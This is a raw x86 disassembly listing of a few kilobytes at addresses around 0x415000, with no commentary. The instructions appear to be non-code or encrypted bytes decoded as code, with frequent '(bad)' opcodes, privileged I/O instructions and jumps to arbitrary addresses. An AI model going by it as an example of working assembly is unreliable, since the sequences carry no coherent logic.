  41507d:	xchg   ecx,eax
  41507e:	imul   edi,esi,0xc151245c
  415084:	je     0x4150a9
  415086:	not    esi
  415088:	std    
  415089:	(bad)  
  41508a:	and    eax,0x66debf25
  41508f:	stos   BYTE PTR es:[edi],al
  415090:	scas   eax,DWORD PTR es:[edi]
	...
  4150f1:	add    BYTE PTR [eax],al
  4150f3:	add    BYTE PTR [ebx+0x2],bh
  4150f6:	add    ebp,ebx
  4150f8:	jnp    0x4150e5
  4150fa:	sti    
  4150fb:	xchg   edx,eax
  4150fc:	lahf   
  4150fd:	mov    esi,0xf2acfc2d
  415102:	(bad)  
  415103:	sub    al,0x18
  415105:	fiadd  WORD PTR [eax]
  415107:	add    BYTE PTR ds:0xfc000001,al
  41510d:	inc    edx
  41510e:	rol    DWORD PTR [eax+0x54be8953],cl
  415114:	nop
  415115:	fcmovbe st,st(6)
  415117:	sbb    eax,0x2e7c4caf
  41511c:	out    0x9b,eax
  41511e:	int3   
  41511f:	in     al,0xb2
  415121:	xor    edx,esp
  415123:	data16 mov ch,0xb4
  415126:	std    
  415127:	dec    edx
  415128:	jl     0x41510c
  41512a:	loope  0x415166
  41512c:	and    eax,0x950e5c59
  415131:	lods   al,BYTE PTR ds:[esi]
  415132:	lea    ebp,[ecx-0x5e977ec1]
  415138:	(bad)  
  415139:	aad    0xe2
  41513b:	retf   
  41513c:	xchg   DWORD PTR [ebx+0x4647d0bc],edx
  415142:	sub    BYTE PTR [eax],bl
  415144:	adc    bh,bl
  415146:	or     esi,0xfffffffb
  415149:	jge    0x4151ba
  41514b:	pop    edi
  41514c:	adc    BYTE PTR [edx-0x12],0xf1
  415150:	add    ch,0xba
  415153:	call   0x7f22:0x711a1531
  41515a:	aad    0x3b
  41515c:	outs   dx,BYTE PTR ds:[esi]
  41515d:	ss push edi
  41515f:	lock stos BYTE PTR es:[edi],al
  415161:	stos   BYTE PTR es:[edi],al
  415162:	retf   0x1dfe
  415165:	cmc    
  415166:	sti    
  415167:	push   0x7263ec2e
  41516c:	and    dl,BYTE PTR [ebx+esi*1+0x11]
  415170:	xchg   esp,eax
  415171:	mov    dh,0x7
  415173:	and    ch,ah
  415175:	cmp    ch,BYTE PTR [edi-0x3faba6b9]
  41517b:	loopne 0x41511c
  41517d:	out    dx,eax
  41517e:	cli    
  41517f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415180:	sub    DWORD PTR [edi+0x2abd4a36],edx
  415186:	jmp    0x5445:0x31bfbb31
  41518d:	fs mov ebp,0x48656938
  415193:	(bad)  
  415194:	(bad)  
  415196:	push   0xf966437c
  41519b:	xchg   ebp,eax
  41519c:	mov    eax,0xdb5112aa
  4151a1:	xor    DWORD PTR [ebx],edx
  4151a3:	mov    dh,al
  4151a5:	ror    esp,1
  4151a7:	hlt    
  4151a8:	out    dx,eax
  4151a9:	mov    esp,0xffcada4f
  4151ae:	push   eax
  4151af:	in     eax,dx
  4151b0:	outs   dx,DWORD PTR ds:[esi]
  4151b1:	adc    ch,al
  4151b3:	fs push edi
  4151b5:	fild   WORD PTR [ecx]
  4151b7:	out    dx,al
  4151b8:	mov    dl,0x51
  4151ba:	push   cs
  4151bb:	lds    eax,FWORD PTR [eax]
  4151bd:	sub    BYTE PTR [edi],cl
  4151bf:	cmp    eax,ebx
  4151c1:	xchg   edx,eax
  4151c2:	push   ss
  4151c3:	dec    esi
  4151c4:	je     0x4151e4
  4151c6:	or     DWORD PTR [eax],edx
  4151c8:	cmp    al,0x91
  4151ca:	add    eax,0x374f135e
  4151cf:	imul   ecx,ebx,0xb2aef374
  4151d5:	into   
  4151d6:	fild   WORD PTR [eax+edi*4+0x67f231a6]
  4151dd:	fwait
  4151de:	out    0x8,eax
  4151e0:	test   eax,0x870b4d5e
  4151e5:	lea    edx,[eax-0x39636104]
  4151eb:	adc    ah,BYTE PTR [ebp-0x7e]
  4151ee:	sub    ah,bh
  4151f0:	hlt    
  4151f1:	test   DWORD PTR [ebx+0x5659a9b8],esp
  4151f7:	cmp    al,dh
  4151f9:	lock test eax,eax
  4151fc:	je     0x4151b9
  4151fe:	in     al,0xf4
  415200:	imul   DWORD PTR [ebx+0x11]
  415203:	pop    esi
  415204:	dec    edx
  415205:	fcomp  st(6)
  415207:	jp     0x4151ea
  415209:	mov    esi,0x80cf8518
  41520e:	repz jp 0x415215
	...
  415271:	add    BYTE PTR [eax],al
  415273:	add    BYTE PTR [edi+edx*4],ch
  415276:	pop    ds
  415277:	sar    DWORD PTR [edi-0x6001127],1
  41527d:	(bad)  
  41527e:	mov    ecx,0x2302d10b
  415283:	in     eax,0x1d
  415285:	fild   WORD PTR [eax]
  415287:	add    BYTE PTR ds:0x72000001,al
  41528d:	arpl   WORD PTR [eax+0x5e],ax
  415290:	add    DWORD PTR es:[bp+si-0x1],0x37d9bde1
  415299:	(bad)  
  41529a:	stos   DWORD PTR es:[edi],eax
  41529b:	jg     0x415280
  41529d:	sbb    BYTE PTR [esi-0x4d],0x3a
  4152a1:	xor    dh,0x56
  4152a4:	rcr    al,1
  4152a6:	jmp    0x32a20890
  4152ab:	add    esp,0x4f3592e2
  4152b1:	or     al,0x94
  4152b3:	std    
  4152b4:	lods   al,BYTE PTR cs:[esi]
  4152b6:	nop
  4152b7:	lods   al,BYTE PTR ds:[esi]
  4152b8:	outs   dx,BYTE PTR ds:[esi]
  4152b9:	mov    WORD PTR [edx],es
  4152bb:	push   esp
  4152bc:	inc    esp
  4152bd:	mov    ebx,0x476e6bfb
  4152c2:	dec    edx
  4152c3:	push   ebp
  4152c4:	sub    DWORD PTR [edx+edx*2+0x7d],esp
  4152c8:	test   DWORD PTR [ebx],ebx
  4152ca:	aam    0x51
  4152cc:	jge    0x4152fb
  4152ce:	pop    ebx
  4152cf:	in     al,0x98
  4152d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4152d2:	mov    al,ds:0xa8492958
  4152d7:	enter  0xcb6d,0x81
  4152db:	mov    bl,BYTE PTR [eax-0x5d]
  4152de:	enter  0xa44f,0x85
  4152e2:	mov    ebx,0xbecd8d88
  4152e7:	push   esp
  4152e8:	push   ecx
  4152e9:	pusha  
  4152ea:	aam    0xa0
  4152ec:	dec    edx
  4152ed:	add    DWORD PTR [edx+0x29ace944],esp
  4152f3:	les    ebx,FWORD PTR [edx+0x21]
  4152f6:	mov    eax,ds:0x7ba49073
  4152fb:	ja     0x415348
  4152fd:	jmp    0x183ecd32
  415302:	scas   al,BYTE PTR es:[edi]
  415303:	jle    0x41531a
  415305:	add    bl,BYTE PTR [edi+0x7098b772]
  41530b:	push   esi
  41530c:	call   0x2d5fd6d0
  415311:	inc    ebx
  415313:	addr16 and eax,0xa02c74c7
  415319:	iret   
  41531a:	out    0xcb,al
  41531c:	lahf   
  41531d:	sti    
  41531e:	into   
  41531f:	or     eax,0x3af62e7f
  415324:	mov    ebp,0x324ebf6d
  415329:	gs adc al,0xbe
  41532c:	push   ebp
  41532d:	gs cdq 
  41532f:	das    
  415330:	mov    al,0xc1
  415332:	xor    ebp,DWORD PTR [edx-0x11f78147]
  415338:	nop
  415339:	dec    edx
  41533a:	lods   al,BYTE PTR ds:[esi]
  41533b:	loop   0x4152f2
  41533d:	push   edi
  41533e:	lods   al,BYTE PTR ds:[esi]
  41533f:	cmp    al,0xf8
  415341:	pop    eax
  415342:	mov    dl,0x1d
  415344:	out    dx,al
  415345:	pop    ds
  415346:	mov    ds:0x6237bccb,al
  41534b:	jbe    0x415361
  41534d:	push   edx
  41534e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41534f:	inc    esp
  415350:	sub    eax,0x91ea8da
  415355:	pmaxsw mm1,QWORD PTR ss:[ecx+edi*8+0x67]
  41535b:	push   esp
  41535c:	mov    bl,BYTE PTR [ecx-0x51]
  41535f:	out    dx,al
  415360:	pop    ecx
  415361:	cmp    eax,0xd09ba2a2
  415366:	xchg   edi,eax
  415367:	cmc    
  415368:	outs   dx,DWORD PTR gs:[esi]
  41536a:	sub    BYTE PTR ds:0x1aa3e2bb,al
  415370:	retf   0xc4a0
  415373:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415374:	cmp    DWORD PTR [ecx+0x32],0xffffff94
  415378:	fimul  DWORD PTR [ecx]
  41537a:	sub    eax,0xca3e6b1b
  41537f:	cwde   
  415380:	or     ecx,DWORD PTR [edi+0x1d]
  415383:	inc    eax
  415384:	mov    dl,0x45
  415386:	pop    esp
  415387:	outs   dx,BYTE PTR es:[esi]
  415389:	test   BYTE PTR ds:0xe92de089,ch
  41538f:	fistp  QWORD PTR [edi+0x0]
	...
  4153f1:	add    BYTE PTR [eax],al
  4153f3:	add    BYTE PTR [ebp-0x10],ch
  4153f6:	repz jmp FWORD PTR cs:[edi]
  4153fa:	std    
  4153fb:	repz mov edi,0xb6d3e5b0
  415401:	shl    BYTE PTR [edx],0xdf
  415404:	and    ah,al
  415406:	add    BYTE PTR [eax],al
  415408:	add    eax,0x80000001
  41540d:	lock stos BYTE PTR es:[edi],al
  41540f:	mov    eax,0xcd28e11d
  415414:	popf   
  415415:	and    BYTE PTR [edi-0x77],bl
  415418:	mov    esi,0x33195da7
  41541d:	in     al,0x9c
  41541f:	out    dx,al
  415420:	dec    ecx
  415421:	add    DWORD PTR [esp+eax*4],ebp
  415424:	push   0x7bd00f5
  415429:	cdq    
  41542a:	mov    bh,0x32
  41542c:	sub    ebx,DWORD PTR [ebx-0x3a]
  41542f:	dec    edx
  415430:	nop
  415431:	imul   esp,edx,0xa630849
  415437:	ins    BYTE PTR es:[edi],dx
  415438:	add    ch,BYTE PTR [esi-0x3fbc833d]
  41543e:	std    
  41543f:	add    DWORD PTR [ebx-0x6c],eax
  415442:	lock pushf 
  415444:	jmp    ebp
  415446:	cdq    
  415447:	and    al,0x91
  415449:	iret   
  41544a:	jnp    0x41545d
  41544c:	out    dx,al
  41544d:	pop    esi
  41544e:	sbb    al,0xc4
  415450:	test   dh,dl
  415452:	dec    ebx
  415453:	test   DWORD PTR [ebx+0x38],esi
  415456:	outs   dx,DWORD PTR ds:[esi]
  415457:	aas    
  415458:	pop    edi
  415459:	jl     0x4154be
  41545b:	mov    bl,bl
  41545d:	mov    ds:0xedbe8a15,al
  415462:	add    DWORD PTR [ecx+0x19],edx
  415465:	aad    0x18
  415467:	mov    ds:0xc5d3c3b0,al
  41546c:	daa    
  41546d:	cld    
  41546e:	arpl   WORD PTR [eax],cx
  415470:	hlt    
  415471:	cmp    eax,0xfffa9603
  415476:	ins    BYTE PTR es:[edi],dx
  415477:	mov    eax,ds:0x8add2587
  41547c:	(bad)  
  41547e:	rcl    BYTE PTR [edi+0x58],cl
  415481:	dec    ebp
  415482:	out    0x13,al
  415484:	lock in eax,dx
  415486:	leave  
  415487:	jl     0x4154de
  415489:	mov    bh,0x1d
  41548b:	(bad)  
  41548c:	das    
  41548d:	mov    ah,0x5a
  41548f:	fiadd  WORD PTR [eax+0x50]
  415492:	int    0x25
  415494:	cli    
  415495:	sbb    ecx,ecx
  415497:	xor    ch,bl
  415499:	push   ebx
  41549a:	popa   
  41549b:	mov    ch,0xb7
  41549d:	adc    DWORD PTR [edi],edx
  41549f:	mov    BYTE PTR [ebx+0x73],ch
  4154a2:	pop    es
  4154a3:	scas   al,BYTE PTR es:[edi]
  4154a4:	in     al,0x4e
  4154a6:	sub    al,bl
  4154a8:	add    eax,0x5ee5f61d
  4154ad:	cmp    eax,edx
  4154af:	mov    ecx,0xe329fad2
  4154b4:	jo     0x415439
  4154b6:	inc    edx
  4154b7:	ret    
  4154b8:	pop    esp
  4154b9:	dec    edi
  4154ba:	push   ss
  4154bb:	loope  0x4154a7
  4154bd:	pop    ebp
  4154be:	ror    DWORD PTR [edx-0x5e],cl
  4154c1:	sub    edi,ebp
  4154c3:	add    DWORD PTR [eax-0x39],edx
  4154c6:	js     0x4154bf
  4154c8:	clc    
  4154c9:	aam    0x69
  4154cb:	fisub  WORD PTR [esi]
  4154cd:	push   ecx
  4154ce:	repz mov esi,0x4ff74f0b
  4154d4:	in     al,dx
  4154d5:	das    
  4154d6:	popf   
  4154d7:	xchg   BYTE PTR [esi-0x46],dh
  4154da:	pop    ebp
  4154db:	or     eax,0x65a5e672
  4154e0:	enter  0x70b4,0xec
  4154e4:	cmp    DWORD PTR [esp+ebx*4-0x7a3254b8],edi
  4154eb:	xor    DWORD PTR [edi-0x257a7825],ebx
  4154f1:	pop    ecx
  4154f2:	xlat   BYTE PTR ds:[ebx]
  4154f3:	test   eax,0xe7240431
  4154f8:	addr16 dec ebx
  4154fa:	int3   
  4154fb:	nop
  4154fc:	or     dh,BYTE PTR [edi]
  4154fe:	sub    ebp,DWORD PTR [edx+0x7d]
  415501:	sub    eax,0x349a5a97
  415506:	repnz popa 
  415508:	dec    ecx
  415509:	test   BYTE PTR [esp+edx*2],0xf3
  41550d:	lods   al,BYTE PTR ds:[esi]
  41550e:	cmp    BYTE PTR [edi],ch
  415510:	add    BYTE PTR ss:[eax],al
	...
  415573:	add    ah,ah
  415575:	lock sub DWORD PTR [edx],ecx
  415578:	cmp    eax,0xa2fee7db
  41557d:	arpl   WORD PTR [ebx],bp
  41557f:	je     0x4155da
  415581:	loop   0x415558
  415583:	addr16 daa 
  415585:	loope  0x415587
  415587:	add    BYTE PTR ds:0x7d000001,al
  41558d:	repz je 0x415539
  415590:	jmp    0x46f9bee
  415595:	xchg   esi,eax
  415596:	jg     0x415529
  415598:	push   eax
  415599:	cmp    eax,0x17dce9be
  41559e:	jecxz  0x415591
  4155a0:	mov    eax,fs:0x6fd52fc8
  4155a6:	ins    DWORD PTR es:[edi],dx
  4155a7:	fisubr WORD PTR [edi+0xe]
  4155aa:	(bad)  
  4155ac:	out    0xf6,eax
  4155ae:	scas   eax,DWORD PTR es:[edi]
  4155af:	pushf  
  4155b0:	add    eax,0x904d4b15
  4155b5:	sahf   
  4155b6:	push   eax
  4155b7:	and    eax,0x719791f8
  4155bc:	clc    
  4155bd:	push   edx
  4155be:	sti    
  4155bf:	sbb    al,0x18
  4155c1:	cmp    esi,ebx
  4155c3:	pop    esp
  4155c4:	jle    0x4155cd
  4155c6:	cmp    bh,BYTE PTR [ecx+0x7e193d0]
  4155cc:	dec    esi
  4155cd:	repnz in al,dx
  4155cf:	add    BYTE PTR [ebx-0x3558c346],0x8f
  4155d6:	icebp  
  4155d7:	inc    eax
  4155d8:	and    al,0x38
  4155da:	lock stos DWORD PTR es:[edi],eax
  4155dc:	rol    BYTE PTR [edi+0x7d9050f],0x89
  4155e3:	xlat   BYTE PTR ds:[ebx]
  4155e4:	scas   al,BYTE PTR es:[edi]
  4155e5:	aad    0x36
  4155e7:	scas   al,BYTE PTR es:[edi]
  4155e8:	or     BYTE PTR [ebx],dh
  4155ea:	cmc    
  4155eb:	and    al,0x73
  4155ed:	xor    eax,0xd7d74308
  4155f2:	push   0xffffffcc
  4155f4:	int    0x1c
  4155f6:	dec    ebp
  4155f7:	mov    bl,0x5c
  4155f9:	inc    edi
  4155fa:	clc    
  4155fb:	push   esi
  4155fc:	(bad)  
  4155fe:	mov    WORD PTR [ebp+0x227c27ea],cs
  415604:	(bad)  
  415605:	push   edx
  415606:	adc    eax,0xcda57587
  41560b:	or     DWORD PTR [eax+ebx*4],eax
  41560e:	ja     0x415637
  415610:	hlt    
  415611:	mov    ch,0x20
  415613:	inc    esp
  415614:	xchg   edx,eax
  415615:	jae    0x415662
  415617:	jge    0x415647
  415619:	pusha  
  41561a:	and    bl,ch
  41561c:	push   ebx
  41561d:	call   0x7343c2af
  415622:	cmp    BYTE PTR [ebx+0x5c],dh
  415625:	sbb    eax,0x7aab1001
  41562a:	fcom   DWORD PTR [esp+esi*1-0x116fe99a]
  415631:	mov    ds:0x34f9a10,eax
  415636:	fsubr  QWORD PTR [edi-0x62]
  415639:	jmp    0x74caacf8
  41563e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41563f:	test   eax,0xb461baf0
  415644:	inc    esp
  415645:	retf   0x227d
  415648:	jge    0x4155cf
  41564a:	mov    BYTE PTR [ecx],ah
  41564c:	sar    BYTE PTR [edx+0x3797958],cl
  415652:	mov    ah,bh
  415654:	in     eax,dx
  415655:	dec    ebx
  415656:	adc    al,0x29
  415658:	mov    bl,0x57
  41565a:	xor    DWORD PTR [eax],ecx
  41565c:	mov    eax,0x8fe925e3
  415661:	or     esi,edx
  415663:	arpl   WORD PTR [ecx+0x700160fa],bx
  415669:	xor    ecx,DWORD PTR [edi+0x38]
  41566c:	out    0x5b,al
  41566e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41566f:	call   0xc505:0x48ecce51
  415676:	loop   0x4156db
  415678:	test   BYTE PTR [eax+ebx*1-0x787d5605],dl
  41567f:	imul   ebp,edi,0x49aba528
  415685:	sub    eax,0xc87d6265
  41568a:	sub    eax,0x1a374a16
  41568f:	dec    ebp
  415690:	test   eax,0x0
	...
  4156f1:	add    BYTE PTR [eax],al
  4156f3:	add    BYTE PTR [ebp-0x66],ch
  4156f6:	mov    esp,0xfd67ff45
  4156fb:	mov    edx,0x2c46bab3
  415700:	arpl   WORD PTR [esi-0x45],sp
  415703:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415704:	sub    al,0xe2
  415706:	add    BYTE PTR [eax],al
  415708:	add    eax,0x4b000001
  41570d:	stc    
  41570e:	into   
  41570f:	(bad)  
  415710:	mov    edx,0xaa972096
  415715:	mov    ?,eax
  415717:	mov    ch,0x56
  415719:	bound  ebp,QWORD PTR [eax-0x57]
  41571c:	mov    esi,0x34e58c98
  415721:	dec    edi
  415722:	jmp    0xd8b866e5
  415727:	xchg   DWORD PTR [ebp-0x10],ebp
  41572a:	jae    0x4156de
  41572c:	add    DWORD PTR [ecx+0x1b],0xa33b99ef
  415733:	popf   
  415734:	shr    DWORD PTR [eax+edi*2],0x11
  415738:	push   eax
  415739:	mov    esp,0x7d6048a3
  41573e:	ds mov ch,0x4e
  415741:	repz adc eax,0x11683e93
  415747:	rol    DWORD PTR [esi+0xc],0x51
  41574b:	push   DWORD PTR [esi-0x33]
  41574e:	or     ecx,esi
  415750:	shl    DWORD PTR [ebp+0xe0cd196],0xc1
  415757:	jmp    0x9d8a7299
  41575c:	and    DWORD PTR [esi+0x38],esi
  41575f:	test   al,0x85
  415761:	adc    cl,cl
  415763:	jecxz  0x41578a
  415765:	std    
  415766:	or     eax,0xf2ba8109
  41576b:	in     al,0xd0
  41576d:	jmp    0x65cc:0xc6f092df
  415774:	pusha  
  415775:	leave  
  415776:	jecxz  0x415712
  415778:	adc    esi,eax
  41577a:	lods   al,BYTE PTR ds:[esi]
  41577b:	fimul  DWORD PTR [ebx+eiz*4-0x73]
  41577f:	les    esp,FWORD PTR [eax]
  415781:	(bad)  
  415783:	ficom  DWORD PTR [esi+edx*1-0x65cc9d99]
  41578a:	xchg   edx,eax
  41578b:	out    0x6b,al
  41578d:	pop    eax
  41578e:	cs push cs
  415790:	push   cs
  415791:	mov    esp,0x6b1c82f3
  415796:	push   edx
  415797:	ja     0x2f6cc664
  41579d:	cmc    
  41579e:	push   cs
  41579f:	imul   edi,eax,0xe68a56a3
  4157a5:	imul   DWORD PTR [edx+0x796ac257]
  4157ab:	xchg   dl,al
  4157ad:	stos   DWORD PTR es:[edi],eax
  4157ae:	sbb    al,0xdb
  4157b0:	pop    ebx
  4157b1:	adc    ah,bl
  4157b3:	fisttp QWORD PTR [bp+si-0x135b]
  4157b8:	scas   eax,DWORD PTR es:[edi]
  4157b9:	pop    edx
  4157ba:	bound  esi,QWORD PTR [edx+eax*1+0x43]
  4157be:	nop
  4157bf:	cld    
  4157c0:	loopne 0x4157be
  4157c2:	fucomp st(0)
  4157c4:	xlat   BYTE PTR ds:[ebx]
  4157c5:	ror    BYTE PTR [eax],0xf1
  4157c8:	cmp    eax,0xe5f72417
  4157cd:	xor    eax,0x69d9649e
  4157d2:	push   ebp
  4157d3:	fnstsw WORD PTR [ebx+0x24ed7a38]
  4157d9:	mov    cl,0x95
  4157db:	xchg   edi,eax
  4157dc:	inc    ecx
  4157dd:	push   ss
  4157de:	adc    DWORD PTR [esi-0x5d],esi
  4157e1:	dec    esp
  4157e2:	pop    eax
  4157e3:	in     eax,dx
  4157e4:	dec    ebx
  4157e5:	mov    ebp,0x11100677
  4157ea:	icebp  
  4157eb:	mov    ebp,0xdf966c69
  4157f0:	xchg   ecx,eax
  4157f1:	xor    eax,0x1d1592f3
  4157f6:	pop    ecx
  4157f7:	xchg   edi,eax
  4157f8:	sti    
  4157f9:	mov    dl,0xa4
  4157fb:	in     al,0x74
  4157fd:	pop    ss
  4157fe:	nop
  4157ff:	mov    bl,0xb1
  415801:	and    edi,DWORD PTR [edi+0x38]
  415804:	bound  eax,QWORD PTR [edi]
  415806:	jns    0x415840
  415808:	imul   edx,DWORD PTR [eax+0x7fe0fe94],0x70d556
	...
  415872:	add    BYTE PTR [eax],al
  415874:	retf   
  415875:	(bad)  
  415876:	xchg   ebx,eax
  415877:	in     al,dx
  415878:	mov    bh,0xed
  41587a:	(bad)  
  41587b:	inc    DWORD PTR [edi]
  41587d:	(bad)  
  41587f:	shl    DWORD PTR [ebx-0x19],cl
  415882:	add    bh,BYTE PTR [ebp+0xe331]
  415888:	add    eax,0x96000001
  41588d:	test   eax,0x88bf7659
  415892:	xchg   DWORD PTR [ebx],edx
  415894:	out    0x89,eax
  415896:	mov    al,0x53
  415898:	mov    ah,0x1a
  41589a:	sub    al,0xf9
  41589c:	les    ebx,FWORD PTR [ebx+0x10]
  41589f:	bound  edx,QWORD PTR [bx+si-0x5c]
  4158a3:	xchg   DWORD PTR [ecx],esp
  4158a5:	jecxz  0x415858
  4158a7:	ficomp WORD PTR [esi]
  4158a9:	dec    ebx
  4158aa:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4158ab:	mov    eax,ds:0x5baff078
  4158b0:	push   esp
  4158b1:	call   0xc076:0x4c74e475
  4158b8:	out    0xae,al
  4158ba:	sar    BYTE PTR [eax],1
  4158bc:	out    0x3d,al
  4158be:	xchg   esp,eax
  4158bf:	push   ss
  4158c0:	mov    eax,ds:0x47d756d9
  4158c5:	aad    0x2f
  4158c7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4158c8:	int    0xd
  4158ca:	repnz fisttp QWORD PTR [esp+edx*1-0x4d0637cf]
  4158d2:	jnp    0x415916
  4158d4:	mov    ds:0x45808bda,eax
  4158d9:	sbb    ecx,DWORD PTR [ebx-0x209e3bab]
  4158df:	pop    edi
  4158e0:	add    cl,BYTE PTR [ecx]
  4158e2:	add    BYTE PTR [eax+0x67],0x11
  4158e6:	mov    DWORD PTR [esi+0x79],esp
  4158e9:	or     eax,DWORD PTR [eax-0x6b]
  4158ec:	lea    ebx,[ecx-0x653df17]
  4158f2:	jo     0x41593e
  4158f4:	(bad)  
  4158f5:	xchg   BYTE PTR [edi],ch
  4158f7:	out    0x44,al
  4158f9:	mov    ah,0x92
  4158fb:	inc    esi
  4158fc:	js     0x415891
  4158fe:	add    al,0xb4
  415900:	jo     0x4158da
  415902:	test   DWORD PTR [ebx],edi
  415904:	loop   0x4158b7
  415906:	pop    ds
  415907:	jne    0x415982
  415909:	fmul   DWORD PTR [ebx+edi*1-0x2d4e5a4a]
  415910:	rcr    BYTE PTR [eax],0xaa
  415913:	cmp    ebx,esi
  415915:	aaa    
  415916:	(bad)  
  415917:	push   ss
  415918:	imul   ebx,DWORD PTR [ecx+0x17bd3f42],0xf9a3db9d
  415922:	mov    edi,0x8561f58d
  415927:	fs cdq 
  415929:	pop    eax
  41592b:	es pop ds
  41592d:	enter  0x6a9a,0xd4
  415931:	xor    al,0x91
  415933:	mov    bl,0x97
  415935:	data16 js 0x4158ec
  415938:	test   al,0x15
  41593a:	icebp  
  41593b:	stos   DWORD PTR es:[edi],eax
  41593c:	push   ebx
  41593d:	jo     0x415939
  41593f:	sahf   
  415940:	or     eax,0x55b3fdf3
  415945:	push   cs
  415946:	aam    0xb5
  415948:	sbb    dl,ch
  41594a:	shl    BYTE PTR [ebx-0x73be4b2a],0x9c
  415951:	scas   al,BYTE PTR es:[edi]
  415952:	mov    cl,0xb5
  415954:	push   0xfffffff6
  415956:	cmp    esp,DWORD PTR ds:0xa6bce8ad
  41595c:	sub    DWORD PTR [esi-0x22ef2a65],eax
  415962:	xchg   BYTE PTR [eax],bl
  415964:	xchg   edi,eax
  415965:	int    0x5f
  415967:	adc    ebx,ebp
  415969:	nop
  41596a:	cmc    
  41596b:	ror    al,1
  41596d:	mov    ss,esp
  41596f:	ret    0x905f
  415972:	jo     0x415924
  415974:	fs dec ebp
  415976:	pop    DWORD PTR [eax+0x50]
  415979:	arpl   WORD PTR [esi],cx
  41597b:	mov    esp,0xa3b64e4c
  415980:	jmp    0xcdd0a9c8
  415985:	fsubrp st(2),st
  415987:	dec    esi
  415988:	ret    0x3d75
  41598b:	ror    DWORD PTR [edi+0x7270fb78],cl
	...
  4159f1:	add    BYTE PTR [eax],al
  4159f3:	add    BYTE PTR [ebp-0x78],al
  4159f6:	sub    al,0x77
  4159f8:	in     eax,dx
  4159f9:	neg    DWORD PTR [edi-0x46]
  4159fc:	sub    edi,DWORD PTR [edi-0x10]
  4159ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a00:	sub    BYTE PTR [eax+0x6b],0x96
  415a04:	ss in  al,0x0
  415a07:	add    BYTE PTR ds:0xba000001,al
  415a0d:	fstp   DWORD PTR [edx-0x75]
  415a10:	sub    al,0x3c
  415a12:	dec    esi
  415a13:	int    0x2e
  415a15:	mul    BYTE PTR [ebx+0x7ff494ba]
  415a1b:	jmp    0xc0ab3554
  415a20:	xchg   esi,eax
  415a21:	and    ch,BYTE PTR [edi]
  415a23:	cmp    DWORD PTR [esp+ebp*8],ebx
  415a26:	push   edx
  415a27:	shl    cl,cl
  415a29:	sub    edx,DWORD PTR [edx+0x5c6efa2d]
  415a2f:	ss call 0x3128:0xf7426a56
  415a37:	sub    BYTE PTR [ebp+0x6e],bl
  415a3a:	jmp    0x415aaa
  415a3c:	mov    al,ds:0x2c19ff8b
  415a41:	mov    cl,0x3a
  415a43:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415a44:	xlat   BYTE PTR ds:[ebx]
  415a45:	(bad)  
  415a46:	sbb    eax,0x4a8509d3
  415a4b:	xchg   ecx,eax
  415a4c:	add    ch,BYTE PTR [esi+0x48]
  415a4f:	call   0x1a3655b2
  415a54:	push   eax
  415a55:	jb     0x415a25
  415a57:	push   esi
  415a58:	mov    edx,0x1cb306f1
  415a5d:	nop
  415a5e:	loopne 0x415a31
  415a60:	adc    eax,0x15cf99e5
  415a65:	mov    bh,0x2e
  415a67:	push   edx
  415a68:	and    esi,eax
  415a6a:	mov    al,0x90
  415a6c:	mov    bl,0xf4
  415a6e:	or     eax,0x24ed07b8
  415a73:	ja     0x415a7e
  415a75:	xlat   BYTE PTR ds:[ebx]
  415a76:	pusha  
  415a77:	(bad)  
  415a78:	rcl    BYTE PTR [ebx],1
  415a7a:	imul   eax,DWORD PTR [esi],0xffffff84
  415a7d:	inc    esi
  415a7e:	inc    ebx
  415a7f:	loop   0x415a1d
  415a81:	xor    eax,0x36aa57bd
  415a86:	addr16 pop ds
  415a88:	popf   
  415a89:	lea    ebp,[eax+0x520ba7c0]
  415a8f:	jl     0x415adc
  415a91:	outs   dx,DWORD PTR ds:[esi]
  415a92:	ror    esp,cl
  415a94:	xchg   edx,eax
  415a95:	cmp    eax,0x701ea6c6
  415a9a:	xor    BYTE PTR [ebp+0x3e0dceb0],ch
  415aa0:	pop    ds
  415aa1:	pop    es
  415aa2:	out    dx,al
  415aa3:	sbb    DWORD PTR [eax+0x69b298bc],eax
  415aa9:	or     DWORD PTR [ebx],0x1b53efec
  415aaf:	jp     0x415a54
  415ab1:	enter  0x9669,0x31
  415ab5:	aam    0x10
  415ab7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ab8:	out    0x17,al
  415aba:	or     eax,DWORD PTR [esi-0x55]
  415abd:	mov    ss,WORD PTR [edi+0xd8d71b4]
  415ac3:	push   ebx
  415ac4:	cld    
  415ac5:	rcl    BYTE PTR [ebx],0xe9
  415ac8:	leave  
  415ac9:	cmp    eax,0x31e09d2e
  415ace:	dec    ecx
  415acf:	sar    al,cl
  415ad1:	loop   0x415b52
  415ad3:	xor    al,0x2b
  415ad5:	std    
  415ad6:	sbb    BYTE PTR [ecx],cl
  415ad8:	sub    eax,0x6217f653
  415add:	dec    edx
  415ade:	data16 arpl WORD PTR [ebp+0x6175c521],bx
  415ae5:	push   DWORD PTR [edi+0x48]
  415ae8:	shl    DWORD PTR [edx+edx*4],0x0
  415aec:	call   0x636d:0x60f3f86f
  415af3:	sub    DWORD PTR [ebx-0xc],edx
  415af6:	dec    ebp
  415af7:	inc    ecx
  415af8:	cdq    
  415af9:	test   eax,0xeee14a94
  415afe:	fwait
  415aff:	jae    0x415b37
  415b01:	repz and DWORD PTR [ecx],eax
  415b04:	xchg   esp,eax
  415b05:	jmp    0x415b05
  415b07:	les    ecx,FWORD PTR [ebp+0x26]
  415b0a:	pop    ebx
  415b0b:	push   ebx
  415b0c:	and    DWORD PTR [ebx],ecx
  415b0e:	int    0xd3
  415b10:	jmp    0x0:0x0
	...
  415b73:	add    bh,bl
  415b75:	mov    esi,0xbb659205
  415b7a:	(bad)  
  415b7c:	stc    
  415b7d:	dec    ebp
  415b7e:	push   ss
  415b7f:	fdivr  QWORD PTR [ecx+0x3bd515d6]
  415b85:	in     eax,0x0
  415b87:	add    BYTE PTR ds:0x37000001,al
